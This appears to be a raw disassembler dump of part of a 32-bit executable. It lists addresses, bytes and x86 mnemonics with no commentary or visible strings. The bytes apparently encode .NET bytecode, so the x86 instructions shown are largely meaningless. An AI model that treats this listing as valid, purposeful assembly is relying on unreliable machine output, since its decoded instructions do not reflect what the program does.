  402b45:	00 00                	add    %al,(%eax)
  402b47:	04 07                	add    $0x7,%al
  402b49:	6f                   	outsl  %ds:(%esi),(%dx)
  402b4a:	65 00 00             	add    %al,%gs:(%eax)
  402b4d:	0a 2a                	or     (%edx),%ch
  402b4f:	00 1b                	add    %bl,(%ebx)
  402b51:	30 02                	xor    %al,(%edx)
  402b53:	00 51 00             	add    %dl,0x0(%ecx)
  402b56:	00 00                	add    %al,(%eax)
  402b58:	17                   	pop    %ss
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402b5e:	06                   	push   %es
  402b5f:	26 00 00             	add    %al,%es:(%eax)
  402b62:	06                   	push   %es
  402b63:	73 4d                	jae    0x402bb2
  402b65:	00 00                	add    %al,(%eax)
  402b67:	06                   	push   %es
  402b68:	0a 72 1f             	or     0x1f(%edx),%dh
  402b6b:	01 00                	add    %eax,(%eax)
  402b6d:	70 7e                	jo     0x402bed
  402b6f:	19 00                	sbb    %eax,(%eax)
  402b71:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b74:	66 00 00             	data16 add %al,(%eax)
  402b77:	0a 02                	or     (%edx),%al
  402b79:	28 66 00             	sub    %ah,0x0(%esi)
  402b7c:	00 0a                	add    %cl,(%edx)
  402b7e:	7e 19                	jle    0x402b99
  402b80:	00 00                	add    %al,(%eax)
  402b82:	04 28                	add    $0x28,%al
  402b84:	66 00 00             	data16 add %al,(%eax)
  402b87:	0a 28                	or     (%eax),%ch
  402b89:	38 00                	cmp    %al,(%eax)
  402b8b:	00 06                	add    %al,(%esi)
  402b8d:	28 66 00             	sub    %ah,0x0(%esi)
  402b90:	00 0a                	add    %cl,(%edx)
  402b92:	28 3b                	sub    %bh,(%ebx)
  402b94:	00 00                	add    %al,(%eax)
  402b96:	0a 28                	or     (%eax),%ch
  402b98:	1c 00                	sbb    $0x0,%al
  402b9a:	00 06                	add    %al,(%esi)
  402b9c:	de 0e                	fimuls (%esi)
  402b9e:	25 28 29 00 00       	and    $0x2928,%eax
  402ba3:	0a 0b                	or     (%ebx),%cl
  402ba5:	28 2a                	sub    %ch,(%edx)
  402ba7:	00 00                	add    %al,(%eax)
  402ba9:	0a de                	or     %dh,%bl
  402bab:	00 2a                	add    %ch,(%edx)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	00 01                	add    %al,(%ecx)
  402bb1:	10 00                	adc    %al,(%eax)
  402bb3:	00 00                	add    %al,(%eax)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	00 42 42             	add    %al,0x42(%edx)
  402bba:	00 0e                	add    %cl,(%esi)
  402bbc:	24 00                	and    $0x0,%al
  402bbe:	00 01                	add    %al,(%ecx)
  402bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  402bc1:	72 25                	jb     0x402be8
  402bc3:	01 00                	add    %eax,(%eax)
  402bc5:	70 03                	jo     0x402bca
  402bc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc8:	67 00 00             	add    %al,(%bx,%si)
  402bcb:	0a 72 39             	or     0x39(%edx),%dh
  402bce:	01 00                	add    %eax,(%eax)
  402bd0:	70 28                	jo     0x402bfa
  402bd2:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402bd7:	26 00 00             	add    %al,%es:(%eax)
  402bda:	06                   	push   %es
  402bdb:	2a 5a 72             	sub    0x72(%edx),%bl
  402bde:	39 01                	cmp    %eax,(%ecx)
  402be0:	00 70 03             	add    %dh,0x3(%eax)
  402be3:	6f                   	outsl  %ds:(%esi),(%dx)
  402be4:	67 00 00             	add    %al,(%bx,%si)
  402be7:	0a 28                	or     (%eax),%ch
  402be9:	47                   	inc    %edi
  402bea:	00 00                	add    %al,(%eax)
  402bec:	0a 28                	or     (%eax),%ch
  402bee:	26 00 00             	add    %al,%es:(%eax)
  402bf1:	06                   	push   %es
  402bf2:	2a 00                	sub    (%eax),%al
  402bf4:	1b 30                	sbb    (%eax),%esi
  402bf6:	0a 00                	or     (%eax),%al
  402bf8:	ba 31 00 00 18       	mov    $0x18000031,%edx
  402bfd:	00 00                	add    %al,(%eax)
  402bff:	11 73 55             	adc    %esi,0x55(%ebx)
  402c02:	00 00                	add    %al,(%eax)
  402c04:	06                   	push   %es
  402c05:	0a 06                	or     (%esi),%al
  402c07:	02 28                	add    (%eax),%ch
  402c09:	3e 00 00             	add    %al,%ds:(%eax)
  402c0c:	06                   	push   %es
  402c0d:	28 37                	sub    %dh,(%edi)
  402c0f:	00 00                	add    %al,(%eax)
  402c11:	06                   	push   %es
  402c12:	7e 19                	jle    0x402c2d
  402c14:	00 00                	add    %al,(%eax)
  402c16:	04 28                	add    $0x28,%al
  402c18:	3b 00                	cmp    (%eax),%eax
  402c1a:	00 0a                	add    %cl,(%edx)
  402c1c:	15 16 28 68 00       	adc    $0x682816,%eax
  402c21:	00 0a                	add    %cl,(%edx)
  402c23:	7d 28                	jge    0x402c4d
  402c25:	00 00                	add    %al,(%eax)
  402c27:	04 06                	add    $0x6,%al
  402c29:	7b 28                	jnp    0x402c53
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	04 16                	add    $0x16,%al
  402c2f:	9a 13 23 11 23 72 3f 	lcall  $0x3f72,$0x23112313
  402c36:	01 00                	add    %eax,(%eax)
  402c38:	70 16                	jo     0x402c50
  402c3a:	28 69 00             	sub    %ch,0x0(%ecx)
  402c3d:	00 0a                	add    %cl,(%edx)
  402c3f:	16                   	push   %ss
  402c40:	33 15 28 45 00 00    	xor    0x4528,%edx
  402c46:	06                   	push   %es
  402c47:	28 6a 00             	sub    %ch,0x0(%edx)
  402c4a:	00 0a                	add    %cl,(%edx)
  402c4c:	16                   	push   %ss
  402c4d:	28 22                	sub    %ah,(%edx)
  402c4f:	00 00                	add    %al,(%eax)
  402c51:	0a 38                	or     (%eax),%bh
  402c53:	51                   	push   %ecx
  402c54:	31 00                	xor    %eax,(%eax)
  402c56:	00 11                	add    %dl,(%ecx)
  402c58:	23 72 47             	and    0x47(%edx),%esi
  402c5b:	01 00                	add    %eax,(%eax)
  402c5d:	70 16                	jo     0x402c75
  402c5f:	28 69 00             	sub    %ch,0x0(%ecx)
  402c62:	00 0a                	add    %cl,(%edx)
  402c64:	16                   	push   %ss
  402c65:	33 20                	xor    (%eax),%esp
  402c67:	7e 10                	jle    0x402c79
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	04 18                	add    $0x18,%al
  402c6d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6e:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c71:	0a 7e 10             	or     0x10(%esi),%bh
  402c74:	00 00                	add    %al,(%eax)
  402c76:	04 6f                	add    $0x6f,%al
  402c78:	5e                   	pop    %esi
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 16                	or     (%esi),%dl
  402c7d:	28 22                	sub    %ah,(%edx)
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	0a 38                	or     (%eax),%bh
  402c83:	21 31                	and    %esi,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	11 23                	adc    %esp,(%ebx)
  402c89:	72 53                	jb     0x402cde
  402c8b:	01 00                	add    %eax,(%eax)
  402c8d:	70 16                	jo     0x402ca5
  402c8f:	28 69 00             	sub    %ch,0x0(%ecx)
  402c92:	00 0a                	add    %cl,(%edx)
  402c94:	16                   	push   %ss
  402c95:	33 6f 06             	xor    0x6(%edi),%ebp
  402c98:	7b 28                	jnp    0x402cc2
  402c9a:	00 00                	add    %al,(%eax)
  402c9c:	04 17                	add    $0x17,%al
  402c9e:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  402ca5:	72 67                	jb     0x402d0e
  402ca7:	01 00                	add    %eax,(%eax)
  402ca9:	70 17                	jo     0x402cc2
  402cab:	8d 03                	lea    (%ebx),%eax
  402cad:	00 00                	add    %al,(%eax)
  402caf:	01 13                	add    %edx,(%ebx)
  402cb1:	24 11                	and    $0x11,%al
  402cb3:	24 16                	and    $0x16,%al
  402cb5:	7e 0a                	jle    0x402cc1
  402cb7:	00 00                	add    %al,(%eax)
  402cb9:	04 a2                	add    $0xa2,%al
  402cbb:	11 24 13             	adc    %esp,(%ebx,%edx,1)
  402cbe:	25 11 25 14 14       	and    $0x14142511,%eax
  402cc3:	17                   	pop    %ss
  402cc4:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  402cc7:	00 01                	add    %al,(%ecx)
  402cc9:	13 26                	adc    (%esi),%esp
  402ccb:	11 26                	adc    %esp,(%esi)
  402ccd:	16                   	push   %ss
  402cce:	17                   	pop    %ss
  402ccf:	9c                   	pushf
  402cd0:	11 26                	adc    %esp,(%esi)
  402cd2:	17                   	pop    %ss
  402cd3:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402cd7:	0a 26                	or     (%esi),%ah
  402cd9:	11 26                	adc    %esp,(%esi)
  402cdb:	16                   	push   %ss
  402cdc:	90                   	nop
  402cdd:	2c 22                	sub    $0x22,%al
  402cdf:	11 25 16 9a 28 11    	adc    %esp,0x11289a16
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	0a d0                	or     %al,%dl
  402ce9:	28 00                	sub    %al,(%eax)
  402ceb:	00 01                	add    %al,(%ecx)
  402ced:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402cf0:	00 0a                	add    %cl,(%edx)
  402cf2:	28 6d 00             	sub    %ch,0x0(%ebp)
  402cf5:	00 0a                	add    %cl,(%edx)
  402cf7:	74 28                	je     0x402d21
  402cf9:	00 00                	add    %al,(%eax)
  402cfb:	01 80 0a 00 00 04    	add    %eax,0x400000a(%eax)
  402d01:	38 a2 30 00 00 11    	cmp    %ah,0x11000030(%edx)
  402d07:	23 72 6d             	and    0x6d(%edx),%esi
  402d0a:	01 00                	add    %eax,(%eax)
  402d0c:	70 16                	jo     0x402d24
  402d0e:	28 69 00             	sub    %ch,0x0(%ecx)
  402d11:	00 0a                	add    %cl,(%edx)
  402d13:	16                   	push   %ss
  402d14:	40                   	inc    %eax
  402d15:	f1                   	int1
  402d16:	00 00                	add    %al,(%eax)
  402d18:	00 06                	add    %al,(%esi)
  402d1a:	7b 28                	jnp    0x402d44
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	04 17                	add    $0x17,%al
  402d20:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  402d27:	72 6d                	jb     0x402d96
  402d29:	01 00                	add    %eax,(%eax)
  402d2b:	70 19                	jo     0x402d46
  402d2d:	8d 03                	lea    (%ebx),%eax
  402d2f:	00 00                	add    %al,(%eax)
  402d31:	01 13                	add    %edx,(%ebx)
  402d33:	25 11 25 16 7e       	and    $0x7e162511,%eax
  402d38:	0a 00                	or     (%eax),%al
  402d3a:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d3d:	11 25 17 06 7b 28    	adc    %esp,0x287b0617
  402d43:	00 00                	add    %al,(%eax)
  402d45:	04 13                	add    $0x13,%al
  402d47:	27                   	daa
  402d48:	11 27                	adc    %esp,(%edi)
  402d4a:	18 13                	sbb    %dl,(%ebx)
  402d4c:	28 11                	sub    %dl,(%ecx)
  402d4e:	28 9a a2 11 25 18    	sub    %bl,0x182511a2(%edx)
  402d54:	06                   	push   %es
  402d55:	7b 28                	jnp    0x402d7f
  402d57:	00 00                	add    %al,(%eax)
  402d59:	04 13                	add    $0x13,%al
  402d5b:	29 11                	sub    %edx,(%ecx)
  402d5d:	29 19                	sub    %ebx,(%ecx)
  402d5f:	13 2a                	adc    (%edx),%ebp
  402d61:	11 2a                	adc    %ebp,(%edx)
  402d63:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  402d6a:	24 14                	and    $0x14,%al
  402d6c:	14 19                	adc    $0x19,%al
  402d6e:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  402d71:	00 01                	add    %al,(%ecx)
  402d73:	13 26                	adc    (%esi),%esp
  402d75:	11 26                	adc    %esp,(%esi)
  402d77:	16                   	push   %ss
  402d78:	17                   	pop    %ss
  402d79:	9c                   	pushf
  402d7a:	11 26                	adc    %esp,(%esi)
  402d7c:	17                   	pop    %ss
  402d7d:	17                   	pop    %ss
  402d7e:	9c                   	pushf
  402d7f:	11 26                	adc    %esp,(%esi)
  402d81:	18 17                	sbb    %dl,(%edi)
  402d83:	9c                   	pushf
  402d84:	11 26                	adc    %esp,(%esi)
  402d86:	17                   	pop    %ss
  402d87:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402d8b:	0a 26                	or     (%esi),%ah
  402d8d:	11 26                	adc    %esp,(%esi)
  402d8f:	16                   	push   %ss
  402d90:	90                   	nop
  402d91:	2c 22                	sub    $0x22,%al
  402d93:	11 24 16             	adc    %esp,(%esi,%edx,1)
  402d96:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  402d9d:	28 00                	sub    %al,(%eax)
  402d9f:	00 01                	add    %al,(%ecx)
  402da1:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402da4:	00 0a                	add    %cl,(%edx)
  402da6:	28 6d 00             	sub    %ch,0x0(%ebp)
  402da9:	00 0a                	add    %cl,(%edx)
  402dab:	74 28                	je     0x402dd5
  402dad:	00 00                	add    %al,(%eax)
  402daf:	01 80 0a 00 00 04    	add    %eax,0x400000a(%eax)
  402db5:	11 26                	adc    %esp,(%esi)
  402db7:	17                   	pop    %ss
  402db8:	90                   	nop
  402db9:	2c 22                	sub    $0x22,%al
  402dbb:	11 27                	adc    %esp,(%edi)
  402dbd:	11 28                	adc    %ebp,(%eax)
  402dbf:	11 24 17             	adc    %esp,(%edi,%edx,1)
  402dc2:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  402dc9:	28 00                	sub    %al,(%eax)
  402dcb:	00 01                	add    %al,(%ecx)
  402dcd:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402dd0:	00 0a                	add    %cl,(%edx)
  402dd2:	28 6d 00             	sub    %ch,0x0(%ebp)
  402dd5:	00 0a                	add    %cl,(%edx)
  402dd7:	74 28                	je     0x402e01
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	01 a2 11 26 18 90    	add    %esp,-0x6fe7d9ef(%edx)
  402de1:	2c 22                	sub    $0x22,%al
  402de3:	11 29                	adc    %ebp,(%ecx)
  402de5:	11 2a                	adc    %ebp,(%edx)
  402de7:	11 24 18             	adc    %esp,(%eax,%ebx,1)
  402dea:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  402df1:	28 00                	sub    %al,(%eax)
  402df3:	00 01                	add    %al,(%ecx)
  402df5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402df8:	00 0a                	add    %cl,(%edx)
  402dfa:	28 6d 00             	sub    %ch,0x0(%ebp)
  402dfd:	00 0a                	add    %cl,(%edx)
  402dff:	74 28                	je     0x402e29
  402e01:	00 00                	add    %al,(%eax)
  402e03:	01 a2 38 9e 2f 00    	add    %esp,0x2f9e38(%edx)
  402e09:	00 11                	add    %dl,(%ecx)
  402e0b:	23 72 7b             	and    0x7b(%edx),%esi
  402e0e:	01 00                	add    %eax,(%eax)
  402e10:	70 16                	jo     0x402e28
  402e12:	28 69 00             	sub    %ch,0x0(%ecx)
  402e15:	00 0a                	add    %cl,(%edx)
  402e17:	16                   	push   %ss
  402e18:	33 1a                	xor    (%edx),%ebx
  402e1a:	06                   	push   %es
  402e1b:	7b 28                	jnp    0x402e45
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	04 17                	add    $0x17,%al
  402e21:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  402e28:	18 9a 28 32 00 00    	sbb    %bl,0x3228(%edx)
  402e2e:	06                   	push   %es
  402e2f:	38 74 2f 00          	cmp    %dh,0x0(%edi,%ebp,1)
  402e33:	00 11                	add    %dl,(%ecx)
  402e35:	23 72 81             	and    -0x7f(%edx),%esi
  402e38:	01 00                	add    %eax,(%eax)
  402e3a:	70 16                	jo     0x402e52
  402e3c:	28 69 00             	sub    %ch,0x0(%ecx)
  402e3f:	00 0a                	add    %cl,(%edx)
  402e41:	16                   	push   %ss
  402e42:	40                   	inc    %eax
  402e43:	89 00                	mov    %eax,(%eax)
  402e45:	00 00                	add    %al,(%eax)
  402e47:	28 6e 00             	sub    %ch,0x0(%esi)
  402e4a:	00 0a                	add    %cl,(%edx)
  402e4c:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	0a 13                	or     (%ebx),%dl
  402e52:	2b 12                	sub    (%edx),%edx
  402e54:	2b 28                	sub    (%eax),%ebp
  402e56:	70 00                	jo     0x402e58
  402e58:	00 0a                	add    %cl,(%edx)
  402e5a:	8c 0f                	mov    %cs,(%edi)
  402e5c:	00 00                	add    %al,(%eax)
  402e5e:	01 0b                	add    %ecx,(%ebx)
  402e60:	72 81                	jb     0x402de3
  402e62:	01 00                	add    %eax,(%eax)
  402e64:	70 7e                	jo     0x402ee4
  402e66:	19 00                	sbb    %eax,(%eax)
  402e68:	00 04 28             	add    %al,(%eax,%ebp,1)
  402e6b:	71 00                	jno    0x402e6d
  402e6d:	00 0a                	add    %cl,(%edx)
  402e6f:	07                   	pop    %es
  402e70:	14 72                	adc    $0x72,%al
  402e72:	89 01                	mov    %eax,(%ecx)
  402e74:	00 70 16             	add    %dh,0x16(%eax)
  402e77:	8d 03                	lea    (%ebx),%eax
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 14 14             	add    %edx,(%esp,%edx,1)
  402e7e:	14 28                	adc    $0x28,%al
  402e80:	72 00                	jb     0x402e82
  402e82:	00 0a                	add    %cl,(%edx)
  402e84:	28 71 00             	sub    %dh,0x0(%ecx)
  402e87:	00 0a                	add    %cl,(%edx)
  402e89:	7e 19                	jle    0x402ea4
  402e8b:	00 00                	add    %al,(%eax)
  402e8d:	04 28                	add    $0x28,%al
  402e8f:	71 00                	jno    0x402e91
  402e91:	00 0a                	add    %cl,(%edx)
  402e93:	07                   	pop    %es
  402e94:	14 72                	adc    $0x72,%al
  402e96:	95                   	xchg   %eax,%ebp
  402e97:	01 00                	add    %eax,(%eax)
  402e99:	70 16                	jo     0x402eb1
  402e9b:	8d 03                	lea    (%ebx),%eax
  402e9d:	00 00                	add    %al,(%eax)
  402e9f:	01 14 14             	add    %edx,(%esp,%edx,1)
  402ea2:	14 28                	adc    $0x28,%al
  402ea4:	72 00                	jb     0x402ea6
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	28 71 00             	sub    %dh,0x0(%ecx)
  402eab:	00 0a                	add    %cl,(%edx)
  402ead:	7e 19                	jle    0x402ec8
  402eaf:	00 00                	add    %al,(%eax)
  402eb1:	04 28                	add    $0x28,%al
  402eb3:	71 00                	jno    0x402eb5
  402eb5:	00 0a                	add    %cl,(%edx)
  402eb7:	28 38                	sub    %bh,(%eax)
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	06                   	push   %es
  402ebc:	28 71 00             	sub    %dh,0x0(%ecx)
  402ebf:	00 0a                	add    %cl,(%edx)
  402ec1:	28 3b                	sub    %bh,(%ebx)
  402ec3:	00 00                	add    %al,(%eax)
  402ec5:	0a 28                	or     (%eax),%ch
  402ec7:	1c 00                	sbb    $0x0,%al
  402ec9:	00 06                	add    %al,(%esi)
  402ecb:	38 d8                	cmp    %bl,%al
  402ecd:	2e 00 00             	add    %al,%cs:(%eax)
  402ed0:	11 23                	adc    %esp,(%ebx)
  402ed2:	72 a3                	jb     0x402e77
  402ed4:	01 00                	add    %eax,(%eax)
  402ed6:	70 16                	jo     0x402eee
  402ed8:	28 69 00             	sub    %ch,0x0(%ecx)
  402edb:	00 0a                	add    %cl,(%edx)
  402edd:	16                   	push   %ss
  402ede:	33 3a                	xor    (%edx),%edi
  402ee0:	12 2c 06             	adc    (%esi,%eax,1),%ch
  402ee3:	7b 28                	jnp    0x402f0d
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	04 17                	add    $0x17,%al
  402ee9:	9a 28 39 00 00 0a 06 	lcall  $0x60a,$0x3928
  402ef0:	7b 28                	jnp    0x402f1a
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	04 18                	add    $0x18,%al
  402ef6:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  402efd:	73 00                	jae    0x402eff
  402eff:	00 0a                	add    %cl,(%edx)
  402f01:	11 2c 06             	adc    %ebp,(%esi,%eax,1)
  402f04:	7b 28                	jnp    0x402f2e
  402f06:	00 00                	add    %al,(%eax)
  402f08:	04 19                	add    $0x19,%al
  402f0a:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  402f11:	4b                   	dec    %ebx
  402f12:	00 00                	add    %al,(%eax)
  402f14:	06                   	push   %es
  402f15:	38 8e 2e 00 00 11    	cmp    %cl,0x1100002e(%esi)
  402f1b:	23 72 ab             	and    -0x55(%edx),%esi
  402f1e:	01 00                	add    %eax,(%eax)
  402f20:	70 16                	jo     0x402f38
  402f22:	28 69 00             	sub    %ch,0x0(%ecx)
  402f25:	00 0a                	add    %cl,(%edx)
  402f27:	16                   	push   %ss
  402f28:	33 43 12             	xor    0x12(%ebx),%eax
  402f2b:	2e 06                	cs push %es
  402f2d:	7b 28                	jnp    0x402f57
  402f2f:	00 00                	add    %al,(%eax)
  402f31:	04 17                	add    $0x17,%al
  402f33:	9a 28 39 00 00 0a 06 	lcall  $0x60a,$0x3928
  402f3a:	7b 28                	jnp    0x402f64
  402f3c:	00 00                	add    %al,(%eax)
  402f3e:	04 18                	add    $0x18,%al
  402f40:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  402f47:	74 00                	je     0x402f49
  402f49:	00 0a                	add    %cl,(%edx)
  402f4b:	11 2e                	adc    %ebp,(%esi)
  402f4d:	28 75 00             	sub    %dh,0x0(%ebp)
  402f50:	00 0a                	add    %cl,(%edx)
  402f52:	06                   	push   %es
  402f53:	7b 28                	jnp    0x402f7d
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 19                	add    $0x19,%al
  402f59:	9a 28 39 00 00 0a 16 	lcall  $0x160a,$0x3928
  402f60:	16                   	push   %ss
  402f61:	16                   	push   %ss
  402f62:	17                   	pop    %ss
  402f63:	28 2a                	sub    %ch,(%edx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	06                   	push   %es
  402f68:	38 3b                	cmp    %bh,(%ebx)
  402f6a:	2e 00 00             	add    %al,%cs:(%eax)
  402f6d:	11 23                	adc    %esp,(%ebx)
  402f6f:	72 b3                	jb     0x402f24
  402f71:	01 00                	add    %eax,(%eax)
  402f73:	70 16                	jo     0x402f8b
  402f75:	28 69 00             	sub    %ch,0x0(%ecx)
  402f78:	00 0a                	add    %cl,(%edx)
  402f7a:	16                   	push   %ss
  402f7b:	33 2d 12 2e 06 7b    	xor    0x7b062e12,%ebp
  402f81:	28 00                	sub    %al,(%eax)
  402f83:	00 04 17             	add    %al,(%edi,%edx,1)
  402f86:	9a 28 39 00 00 0a 06 	lcall  $0x60a,$0x3928
  402f8d:	7b 28                	jnp    0x402fb7
  402f8f:	00 00                	add    %al,(%eax)
  402f91:	04 18                	add    $0x18,%al
  402f93:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  402f9a:	74 00                	je     0x402f9c
  402f9c:	00 0a                	add    %cl,(%edx)
  402f9e:	11 2e                	adc    %ebp,(%esi)
  402fa0:	28 75 00             	sub    %dh,0x0(%ebp)
  402fa3:	00 0a                	add    %cl,(%edx)
  402fa5:	38 fe                	cmp    %bh,%dh
  402fa7:	2d 00 00 11 23       	sub    $0x23110000,%eax
  402fac:	72 bb                	jb     0x402f69
  402fae:	01 00                	add    %eax,(%eax)
  402fb0:	70 16                	jo     0x402fc8
  402fb2:	28 69 00             	sub    %ch,0x0(%ecx)
  402fb5:	00 0a                	add    %cl,(%edx)
  402fb7:	16                   	push   %ss
  402fb8:	33 35 06 7b 28 00    	xor    0x287b06,%esi
  402fbe:	00 04 18             	add    %al,(%eax,%ebx,1)
  402fc1:	9a 28 76 00 00 0a 0d 	lcall  $0xd0a,$0x7628
  402fc8:	06                   	push   %es
  402fc9:	7b 28                	jnp    0x402ff3
  402fcb:	00 00                	add    %al,(%eax)
  402fcd:	04 17                	add    $0x17,%al
  402fcf:	9a 28 77 00 00 0a 0c 	lcall  $0xc0a,$0x7728
  402fd6:	08 16                	or     %dl,(%esi)
  402fd8:	09 2d 03 18 2b 01    	or     %ebp,0x12b1803
  402fde:	16                   	push   %ss
  402fdf:	7e 78                	jle    0x403059
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	0a 28                	or     (%eax),%ch
  402fe5:	2b 00                	sub    (%eax),%eax
  402fe7:	00 06                	add    %al,(%esi)
  402fe9:	26 38 b9 2d 00 00 11 	cmp    %bh,%es:0x1100002d(%ecx)
  402ff0:	23 72 c5             	and    -0x3b(%edx),%esi
  402ff3:	01 00                	add    %eax,(%eax)
  402ff5:	70 16                	jo     0x40300d
  402ff7:	28 69 00             	sub    %ch,0x0(%ecx)
  402ffa:	00 0a                	add    %cl,(%edx)
  402ffc:	16                   	push   %ss
  402ffd:	33 42 06             	xor    0x6(%edx),%eax
  403000:	7b 28                	jnp    0x40302a
  403002:	00 00                	add    %al,(%eax)
  403004:	04 17                	add    $0x17,%al
  403006:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40300d:	72 cb                	jb     0x402fda
  40300f:	01 00                	add    %eax,(%eax)
  403011:	70 17                	jo     0x40302a
  403013:	8d 03                	lea    (%ebx),%eax
  403015:	00 00                	add    %al,(%eax)
  403017:	01 13                	add    %edx,(%ebx)
  403019:	25 11 25 16 06       	and    $0x6162511,%eax
  40301e:	7b 28                	jnp    0x403048
  403020:	00 00                	add    %al,(%eax)
  403022:	04 18                	add    $0x18,%al
  403024:	9a 28 3a 00 00 06 28 	lcall  $0x2806,$0x3a28
  40302b:	11 00                	adc    %eax,(%eax)
  40302d:	00 0a                	add    %cl,(%edx)
  40302f:	a2 11 25 14 14       	mov    %al,0x14142511
  403034:	14 17                	adc    $0x17,%al
  403036:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40303a:	0a 26                	or     (%esi),%ah
  40303c:	38 67 2d             	cmp    %ah,0x2d(%edi)
  40303f:	00 00                	add    %al,(%eax)
  403041:	11 23                	adc    %esp,(%ebx)
  403043:	72 d9                	jb     0x40301e
  403045:	01 00                	add    %eax,(%eax)
  403047:	70 16                	jo     0x40305f
  403049:	28 69 00             	sub    %ch,0x0(%ecx)
  40304c:	00 0a                	add    %cl,(%edx)
  40304e:	16                   	push   %ss
  40304f:	33 3e                	xor    (%esi),%edi
  403051:	28 79 00             	sub    %bh,0x0(%ecx)
  403054:	00 0a                	add    %cl,(%edx)
  403056:	72 df                	jb     0x403037
  403058:	01 00                	add    %eax,(%eax)
  40305a:	70 06                	jo     0x403062
  40305c:	7b 28                	jnp    0x403086
  40305e:	00 00                	add    %al,(%eax)
  403060:	04 17                	add    $0x17,%al
  403062:	9a 28 25 00 00 0a 13 	lcall  $0x130a,$0x2528
  403069:	04 73                	add    $0x73,%al
  40306b:	7a 00                	jp     0x40306d
  40306d:	00 0a                	add    %cl,(%edx)
  40306f:	13 05 11 05 06 7b    	adc    0x7b060511,%eax
  403075:	28 00                	sub    %al,(%eax)
  403077:	00 04 18             	add    %al,(%eax,%ebx,1)
  40307a:	9a 11 04 6f 7b 00 00 	lcall  $0x0,$0x7b6f0411
  403081:	0a 11                	or     (%ecx),%dl
  403083:	04 28                	add    $0x28,%al
  403085:	7c 00                	jl     0x403087
  403087:	00 0a                	add    %cl,(%edx)
  403089:	26 38 19             	cmp    %bl,%es:(%ecx)
  40308c:	2d 00 00 11 23       	sub    $0x23110000,%eax
  403091:	72 e3                	jb     0x403076
  403093:	01 00                	add    %eax,(%eax)
  403095:	70 16                	jo     0x4030ad
  403097:	28 69 00             	sub    %ch,0x0(%ecx)
  40309a:	00 0a                	add    %cl,(%edx)
  40309c:	16                   	push   %ss
  40309d:	33 28                	xor    (%eax),%ebp
  40309f:	72 e3                	jb     0x403084
  4030a1:	01 00                	add    %eax,(%eax)
  4030a3:	70 7e                	jo     0x403123
  4030a5:	19 00                	sbb    %eax,(%eax)
  4030a7:	00 04 28             	add    %al,(%eax,%ebp,1)
  4030aa:	71 00                	jno    0x4030ac
  4030ac:	00 0a                	add    %cl,(%edx)
  4030ae:	28 38                	sub    %bh,(%eax)
  4030b0:	00 00                	add    %al,(%eax)
  4030b2:	06                   	push   %es
  4030b3:	28 71 00             	sub    %dh,0x0(%ecx)
  4030b6:	00 0a                	add    %cl,(%edx)
  4030b8:	28 3b                	sub    %bh,(%ebx)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	0a 28                	or     (%eax),%ch
  4030be:	1c 00                	sbb    $0x0,%al
  4030c0:	00 06                	add    %al,(%esi)
  4030c2:	38 e1                	cmp    %ah,%cl
  4030c4:	2c 00                	sub    $0x0,%al
  4030c6:	00 11                	add    %dl,(%ecx)
  4030c8:	23 72 f3             	and    -0xd(%edx),%esi
  4030cb:	01 00                	add    %eax,(%eax)
  4030cd:	70 16                	jo     0x4030e5
  4030cf:	28 69 00             	sub    %ch,0x0(%ecx)
  4030d2:	00 0a                	add    %cl,(%edx)
  4030d4:	16                   	push   %ss
  4030d5:	33 58 72             	xor    0x72(%eax),%ebx
  4030d8:	f3 01 00             	repz add %eax,(%eax)
  4030db:	70 7e                	jo     0x40315b
  4030dd:	19 00                	sbb    %eax,(%eax)
  4030df:	00 04 28             	add    %al,(%eax,%ebp,1)
